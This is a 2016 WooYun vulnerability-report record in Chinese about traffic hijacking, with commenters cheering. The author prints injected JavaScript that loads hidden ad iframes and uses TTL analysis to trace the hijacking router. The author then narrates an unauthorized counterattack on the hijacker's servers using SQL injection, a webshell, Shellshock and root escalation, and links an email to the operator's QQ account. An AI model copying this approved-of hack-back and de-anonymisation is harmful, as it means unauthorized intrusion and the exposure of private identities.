{"id": 88747, "wybug_id": "wooyun-2016-0228047", "wybug_title": "一次对链路劫持的反击                  ", "wybug_corp": "互联网应急响应中心", "wybug_author": "路人甲", "wybug_date": "2016-07-12 10:28", "wybug_open_date": "2016-07-17 10:30", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-07-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-07-12：\t厂商已查看当前漏洞内容,细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-07-17：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 起因是几个月前访问乌云和http网站时候网页播放蜜汁声音.当时还是dns劫持比较明显直接改dns就行,最近发现升级成为了链路劫持了,只能拔vpn过日子了.这次懂得了广域网不用ssl已经不安全了.由衷的希望乌云可以上ssl... 如果分析有错希望大家多多包涵.感谢基友的帮忙..最后多说一句劫持就算了吧 服务器做这么水 是要送肉鸡给鸡阔吗？http://www.freebuf.com/vuls/62561.htmlhttp://drops.wooyun.org/tips/11682http://baike.baidu.com/link?url=_0eYS80EQMjttCrMOTKi6EwzymEAVgStJ9DkEWpHsNevMcPVv2xK4gjaeDzAiq8jfWdLfEaLn6uvqPuHCSD5CK 详细说明：  首先先看看先抓包看看\n\n发现百度统计的**.**.**.**的返回包有问题**.**.**.**:8080/tt/1.js/tt/1.js\nvar CUSTOM_LOADJS={support:document.dispatchEvent?\"onload\":\"onreadystatechange\",query:{},module:{},add:function(e,t,n){var r=this.module;if(r[e])throw e+\" is being\";r[e]={},r[e].url=t,r[e].isOkay=n||!1},use:function(e,t){var n={},r;n.namespaces=e.split(\",\"),n.callback=t||function(){},**.**.**.**plet=0,n.total=n.namespaces.length,r=n.namespaces.join(\"\"),this.query[r]=n,this.start(n,r)},start:function(e,t){var n=0,r=e.namespaces.length,i,s;for(n;n<r;n++){s=e.namespaces[n].replace(/^\\s+|\\s+$/g,\"\"),i=this.module[s];if(i===undefined)throw s+\" is undefined\";i.isOkay===!1?(i.isOkay=1,this.load(i.url,s,t)):i.isOkay===!0?this.checkBack(s,t):this.wait(i,s,t)}},wait:function(e,t,n){var r=this,i=setInterval(function(){e.isOkay===!0&&(clearInterval(i),r.checkBack(t,n))},500)},checkBack:function(e,t){this.module[e].isOkay=!0;var n=this.query[t];++**.**.**.**plet===n.total&&(n.callback(),delete this.query[t])},load:function(e,t,n){var r=this,i=document.createElement(\"script\");i[this.support]=function(){/undefined|loaded|complete/.test(i.readyState)&&r.checkBack(t,n)},i.setAttribute(\"type\",\"text/javascript\"),i.setAttribute(\"src\",e),document.getElementsByTagName(\"head\")[0].appendChild(i)}}CUSTOM_LOADJS.add('customadjs', '**.**.**.**:8080/1.js');CUSTOM_LOADJS.use('customadjs', function(){});\n1.js\n~function(){    try{        if(window.location.href.indexOf('**.**.**.**') == -1 && window.location.href.indexOf('**.**.**.**') == -1){                load_page('http://**.**.**.**/js/bbk365_ad_ext.html');                   load_page('http://**.**.**.**/ad/ggj_51yrj.html');                   load_page('http://**.**.**.**/ad/ggj_kea1688.html');                  load_page('http://**.**.**.**/js/bbk365_ad.html');\t\t}    }catch(ee){}}();function load_page(url){    try {        var x_ifr = '<div>'            + ' <iframe style=\"display:none\" src=\"'+url+'\"></iframe>'            + '</div>';        var x = document.createElement('div');        x.style.cssText=\"display:none;\";        x.innerHTML=x_ifr;        document.body.appendChild(x);    } catch (e) {    }}\n1.js里面的\nfunction load_page(url){    try {        var x_ifr = '<div>'            + ' <iframe style=\"display:none\" src=\"'+url+'\"></iframe>'            + '</div>';        var x = document.createElement('div');        x.style.cssText=\"display:none;\";        x.innerHTML=x_ifr;        document.body.appendChild(x);    } catch (e) {    }}\n\n\nhttp://**.**.**.**/js/bbk365_ad_ext.htmlhttp://**.**.**.**/ad/ggj_51yrj.htmlhttp://**.**.**.**/ad/ggj_kea1688.htmlhttp://**.**.**.**/js/bbk365_ad.html先查查域名信息吧,发现大多数都有域名信息保护\n\n然后叫机油用大数据找了一下发现这个邮箱是目标的常用邮箱之一于是找到了QQ\n\n\n\n然后用Wireshark 确定一下是哪一跳出问题了.可以看到有两个相同的包有一个被抛弃了\n\n\n\n不可能在同一个地方跳两次呀有点可疑啊.假设乌云的ttl值为64\n\n经过了9个路由应该是55呀 但是他是52 可以推测是第2-4附近的问题可以得出**.**.**.**就是被劫持的路由器然后对js调用的网站进行了渗透http://**.**.**.**/存在一处注入得到了数据库的root密码和ftp的密码\n\n然后发现是用lnmp搭建的悲催的是发现mysql被降权了,但是是站库分离 说不定数据库开放了ftp于是对c段进行了扫描\n\n过程就是上传了一句话发现Disable_functions了然后用CVE-2014-6271 破壳漏洞搞定最后提权到root\n\n然后在数据库中找到了各种cms的密码进行getshell\n\n\n\n\n\n还有各种广告推广什么的 毕竟不懂他们盈利的方式访问量\n\n大致准确吧\n\n\n\n\n\n   漏洞证明：  劫持的链接有这么一个域名\n\n\n\n发现这个规模不大的公司在做这个 毕竟我不是运营商圈内人士，加上重庆联通这边宽带是外包的就比较复杂 到底是哪个环节出了问题还请jc叔叔们去找了.这样劫持如果被其他黑阔搞下找个0day挂几天分分钟感染一大堆啊...   修复方案：  劫持就算了吧 服务器做这么水 是要送肉鸡给鸡阔吗？   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-07-17 10:30 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-07-12 10:35 |    \t\tadamyi \t\t\t( 实习白帽子  |\t\t\t        Rank:85 漏洞数:10        | 只是一只宝宝)\t\t \n  前排    \n     2016-07-12 10:55 |    \t\tRaven \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:13        | 遇到彩虹，吃定彩虹！)\t\t \n  狭路相逢路人甲胜    \n     2016-07-12 12:13 |    \t\t骸骸 \t\t\t( 普通白帽子  |\t\t\t        Rank:153 漏洞数:35        | 专业装逼三十年。。。)\t\t \n  打雷了    \n     2016-07-12 12:14 |    \t\t带头大哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:910 漏洞数:277        | |任意邮件伪造| |目录遍历| |任意文件读取|...)\t\t \n  版权声明：转载请注明来源 路人甲@乌云    \n     2016-07-12 12:23 |    \t\tDataSource \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:4        | 本屌为小学生，还请各位大牛照顾)\t\t \n  卖瓜子，卖爆米花，来来来了啊，让一让！    \n     2016-07-12 12:50 |    \t\t无名 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:9        | 渗透毁一生，破解穷三代。)\t\t \n  听说霹雷了。    \n     2016-07-12 12:53 |    \t\theoo \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:18        | 努力从来不会亏待任何一个人。)\t\t \n  打雷是什么意思，求科普    \n     2016-07-12 13:01 |    \t\t路飞 \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:22        | 上帝恩赐，命运天定。希望之光，普照我身。...)\t\t \n  mark。    \n     2016-07-12 13:06 |    \t\tBurpSuite \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        | )\t\t \n  什么宽带?长城宽带?鹏博士?    \n     2016-07-12 13:09 |    \t\tterm \t\t\t( 普通白帽子  |\t\t\t        Rank:151 漏洞数:38        )\t\t \n  @heoo 就是这个逼装的 雷都看不下去了 要劈死洞主    \n     2016-07-12 13:11 |    \t\theoo \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:18        | 努力从来不会亏待任何一个人。)\t\t \n  @term 0.0    \n     2016-07-12 13:46 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2016-07-12 14:44 |    \t\t老实先生 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:81        | 问君何不同风起，扶摇直上九万里！)\t\t \n  ccav密切关注    \n     2016-07-12 14:58 |    \t\tskytws \t\t\t( 实习白帽子  |\t\t\t        Rank:87 漏洞数:37        | 好好学习，天天向上)\t\t \n  6666    \n     2016-07-12 15:36 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:265 漏洞数:33        | 开发真是日了狗了)\t\t \n  666，目测劫持服务器有shellshock，被楼主日了？    \n     2016-07-12 16:31 |    \t\tSoulHunter \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:16        | 已经死了。)\t\t \n  好想看啊！！！！！！    \n     2016-07-17 10:37 |    \t\tatiger77 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        | 熟练掌握php,python,go,ruby,c++,java,html...)\t\t \n  危害等级：无影响厂商忽略    \n     2016-07-17 10:57 |    \t\tDusk \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:36        )\t\t \n  这个也管不到人家的事啊，这种东西应该去通知谁？    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}